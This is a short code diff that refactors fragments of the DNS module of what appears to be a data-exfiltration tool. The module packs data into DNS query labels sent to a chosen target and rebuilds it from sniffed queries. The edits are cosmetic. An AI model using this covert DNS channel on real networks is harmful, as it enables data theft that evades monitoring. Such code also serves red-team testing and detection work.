@@ -14,7 +14,7 @@ def handle_dns_query(qname):
         if (config['key'] in qname):
             app_exfiltrate.log_message(
                 'info', '[dns] DNS Query: {0}'.format(qname))
-            jobid = qname[0:7]
+            jobid = qname[:7]
             data = ''.join(qname[7:].replace(config['key'], '').split('.'))
             # app_exfiltrate.log_message('info', '[dns] jobid = {0}'.format(jobid))
             # app_exfiltrate.log_message('info', '[dns] data = {0}'.format(data))
@@ -53,7 +53,7 @@ def sniff(handler):
             data, addr = sock.recvfrom(65536)
             query = dns.DNS(data)
             for qname in query.qd:
-                handler(qname.name + '.')
+                handler(f'{qname.name}.')
         except:
             sock.shutdown()
             sock.close()
@@ -80,20 +80,17 @@ def send(data):
 
     while data != "":
         data = jobid + data
-        for i in range(0, no_labels):
+        for _ in range(0, no_labels):
             if data == "": break
             label = data[:63]
             data = data[63:]
-            domain += label + '.'
-        if data == "":
+            domain += f'{label}.'
+        if data != "" and last_label_len < 1 or data == "":
             domain += config['key']
         else:
-            if last_label_len < 1:
-                domain += config['key']
-            else:
-                label = data[:last_label_len]
-                data = data[last_label_len:]
-                domain += label + '.' + config['key']
+            label = data[:last_label_len]
+            data = data[last_label_len:]
+            domain += f'{label}.' + config['key']
         q = DNSRecord.question(domain)
         domain = ""
         target = choice(targets)
